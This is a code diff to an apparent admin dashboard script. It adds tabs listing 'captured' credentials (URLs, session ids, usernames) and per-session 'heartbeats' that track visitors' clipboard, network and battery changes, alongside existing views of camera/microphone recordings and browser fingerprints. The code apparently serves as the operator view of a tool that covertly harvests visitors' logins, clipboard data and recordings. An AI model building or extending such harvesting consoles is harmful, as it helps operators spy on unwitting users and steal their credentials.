@@ -3,16 +3,31 @@ const loadBtn = document.querySelector('#load');
 const statusEl = document.querySelector('#status');
 const reportsEl = document.querySelector('#reports');
 const recordingsEl = document.querySelector('#recordings');
+const credentialsEl = document.querySelector('#credentials');
+const heartbeatsEl = document.querySelector('#heartbeats');
 const tabReports = document.querySelector('#tabReports');
 const tabRecordings = document.querySelector('#tabRecordings');
+const tabCredentials = document.querySelector('#tabCredentials');
+const tabHeartbeats = document.querySelector('#tabHeartbeats');
 
 const stored = localStorage.getItem('admin_token');
 if (stored) { tokenInput.value = stored; loadAll(); }
 
 tokenInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') loadAll(); });
 loadBtn.addEventListener('click', loadAll);
-tabReports.addEventListener('click', () => { tabReports.classList.add('active'); tabRecordings.classList.remove('active'); reportsEl.hidden = false; recordingsEl.hidden = true; });
-tabRecordings.addEventListener('click', () => { tabRecordings.classList.add('active'); tabReports.classList.remove('active'); recordingsEl.hidden = false; reportsEl.hidden = true; });
+
+function activateTab(active, tabs, panels) {
+  tabs.forEach(t => t.classList.remove('active'));
+  active.classList.add('active');
+  panels.forEach(p => p.hidden = true);
+  const idx = tabs.indexOf(active);
+  if (panels[idx]) panels[idx].hidden = false;
+}
+
+tabReports.addEventListener('click', () => activateTab(tabReports, [tabReports, tabRecordings, tabCredentials, tabHeartbeats], [reportsEl, recordingsEl, credentialsEl, heartbeatsEl]));
+tabRecordings.addEventListener('click', () => activateTab(tabRecordings, [tabReports, tabRecordings, tabCredentials, tabHeartbeats], [reportsEl, recordingsEl, credentialsEl, heartbeatsEl]));
+tabCredentials.addEventListener('click', () => activateTab(tabCredentials, [tabReports, tabRecordings, tabCredentials, tabHeartbeats], [reportsEl, recordingsEl, credentialsEl, heartbeatsEl]));
+tabHeartbeats.addEventListener('click', () => activateTab(tabHeartbeats, [tabReports, tabRecordings, tabCredentials, tabHeartbeats], [reportsEl, recordingsEl, credentialsEl, heartbeatsEl]));
 
 async function loadAll() {
   const token = tokenInput.value.trim();
@@ -20,7 +35,7 @@ async function loadAll() {
   localStorage.setItem('admin_token', token);
   loadBtn.disabled = true;
   statusEl.textContent = 'Loading...';
-  await Promise.all([loadReports(token), loadRecordings(token)]);
+  await Promise.all([loadReports(token), loadRecordings(token), loadCredentials(token), loadHeartbeats(token)]);
   loadBtn.disabled = false;
 }
 
@@ -48,6 +63,28 @@ async function loadRecordings(token) {
   }
 }
 
+async function loadCredentials(token) {
+  try {
+    const resp = await fetch('/api/admin/credentials', { headers: { Authorization: 'Bearer ' + token } });
+    const data = await resp.json();
+    if (!resp.ok) throw new Error(data.error || 'Failed');
+    renderCredentials(data.credentials, token);
+  } catch (err) {
+    credentialsEl.innerHTML = '<div class="empty-state">' + err.message + '</div>';
+  }
+}
+
+async function loadHeartbeats(token) {
+  try {
+    const resp = await fetch('/api/admin/heartbeats', { headers: { Authorization: 'Bearer ' + token } });
+    const data = await resp.json();
+    if (!resp.ok) throw new Error(data.error || 'Failed');
+    renderHeartbeats(data.heartbeats, token);
+  } catch (err) {
+    heartbeatsEl.innerHTML = '<div class="empty-state">' + err.message + '</div>';
+  }
+}
+
 function renderReports(list, token) {
   reportsEl.innerHTML = '';
   if (!list.length) { reportsEl.innerHTML = '<div class="empty-state">No reports yet</div>'; return; }
@@ -57,25 +94,25 @@ function renderReports(list, token) {
     const meta = document.createElement('div');
     meta.className = 'admin-meta';
     const title = document.createElement('strong');
-    const hasRecording = r.fingerprint?.recording_id ? ' \uD83D\uDCF9' : '';
-    title.textContent = 'Report #' + r.id + hasRecording;
+    const fp = r.fingerprint;
+    const hasCamera = fp?.permissions?.camera_microphone?.recording_id ? ' \uD83D\uDCF9' : '';
+    const hasAdvanced = fp?.advanced ? ' \u2699\uFE0F' : '';
+    title.textContent = 'Report #' + r.id + hasCamera + hasAdvanced;
+    const sc = fp?.browser_signals?.Screen || '';
+    const br = fp?.browser_signals?.Browser?.slice(0, 40) || '';
     const date = document.createElement('small');
-    date.textContent = new Date(r.created_at).toLocaleString() + '  \u00b7  ' + r.event_count + ' events';
+    date.textContent = new Date(r.created_at).toLocaleString() + '  \u00b7  ' + r.event_count + ' events' + (sc ? '  \u00b7  ' + sc : '');
     meta.append(title, date);
-
     const actions = document.createElement('div');
     actions.className = 'admin-actions';
-
     const viewBtn = document.createElement('button');
     viewBtn.className = 'text-button';
     viewBtn.textContent = 'View';
     viewBtn.addEventListener('click', () => viewReport(r));
-
     const dlBtn = document.createElement('button');
     dlBtn.className = 'text-button';
     dlBtn.textContent = 'Download';
     dlBtn.addEventListener('click', () => downloadReport(r.id, token));
-
     actions.append(viewBtn, dlBtn);
     row.append(meta, actions);
     reportsEl.append(row);
@@ -96,18 +133,81 @@ function renderRecordings(list, token) {
     const size = r.bytes ? (r.bytes / 1024).toFixed(1) + ' KB' : 'unknown size';
     date.textContent = new Date(r.created_at).toLocaleString() + '  \u00b7  ' + size + '  \u00b7  ' + (r.mime_type || 'webm');
     meta.append(title, date);
-
     const actions = document.createElement('div');
     actions.className = 'admin-actions';
-
     const dlBtn = document.createElement('button');
     dlBtn.className = 'text-button';
     dlBtn.textContent = 'Download';
     dlBtn.addEventListener('click', () => downloadRecording(r.id, token));
-
     actions.append(dlBtn);
     row.append(meta, actions);
     recordingsEl.append(row);
+  });
+}
+
+function renderCredentials(list) {
+  credentialsEl.innerHTML = '';
+  if (!list.length) { credentialsEl.innerHTML = '<div class="empty-state">No credentials captured</div>'; return; }
+  list.forEach((r) => {
+    const row = document.createElement('div');
+    row.className = 'admin-row';
+    const meta = document.createElement('div');
+    meta.className = 'admin-meta';
+    const title = document.createElement('strong');
+    const urlShort = r.url?.length > 50 ? r.url.slice(0, 50) + '...' : r.url || 'unknown';
+    title.textContent = urlShort;
+    const date = document.createElement('small');
+    date.textContent = new Date(r.created_at).toLocaleString() + '  \u00b7  session: ' + (r.session_id || '').slice(0, 10) + (r.username ? '  \u00b7  user: ' + r.username : '');
+    meta.append(title, date);
+    row.append(meta);
+    credentialsEl.append(row);
+  });
+}
+
+function renderHeartbeats(list) {
+  heartbeatsEl.innerHTML = '';
+  if (!list.length) { heartbeatsEl.innerHTML = '<div class="empty-state">No heartbeats yet</div>'; return; }
+  list.forEach((r) => {
+    const row = document.createElement('div');
+    row.className = 'admin-row';
+    const meta = document.createElement('div');
+    meta.className = 'admin-meta';
+    const title = document.createElement('strong');
+    const clipChanges = r.state?.clipboard?.length || 0;
+    const netChanges = r.state?.network?.length || 0;
+    const batChanges = r.state?.battery?.length || 0;
+    title.textContent = 'Session ' + (r.session_id || '').slice(0, 10);
+    const date = document.createElement('small');
+    date.textContent = new Date(r.created_at).toLocaleString() + '  \u00b7  clipboard: ' + clipChanges + '  net: ' + netChanges + '  battery: ' + batChanges;
+    meta.append(title, date);
+    const actions = document.createElement('div');
+    actions.className = 'admin-actions';
+    const viewBtn = document.createElement('button');
+    viewBtn.className = 'text-button';
+    viewBtn.textContent = 'View';
+    viewBtn.addEventListener('click', () => {
+      const overlay = document.createElement('div');
+      overlay.className = 'overlay';
+      const panel = document.createElement('div');
+      panel.className = 'overlay-panel';
+      const head = document.createElement('div');
+      head.className = 'overlay-head';
+      head.innerHTML = '<strong>Heartbeat</strong><button class="text-button close-btn">Close</button>';
+      head.querySelector('.close-btn').addEventListener('click', () => overlay.remove());
+      overlay.addEventListener('click', (e) => { if (e.target === overlay) overlay.remove(); });
+      const body = document.createElement('div');
+      body.className = 'overlay-body';
+      const pre = document.createElement('pre');
+      pre.className = 'json-view';
+      pre.textContent = JSON.stringify(r.state, null, 2);
+      body.append(pre);
+      panel.append(head, body);
+      overlay.append(panel);
+      document.body.append(overlay);
+    });
+    actions.append(viewBtn);
+    row.append(meta, actions);
+    heartbeatsEl.append(row);
   });
 }
 
@@ -154,7 +254,6 @@ function viewReport(r) {
   head.innerHTML = '<strong>Report #' + r.id + '</strong><button class="text-button close-btn">Close</button>';
   head.querySelector('.close-btn').addEventListener('click', () => overlay.remove());
   overlay.addEventListener('click', (e) => { if (e.target === overlay) overlay.remove(); });
-
   const body = document.createElement('div');
   body.className = 'overlay-body';
   const pre = document.createElement('pre');
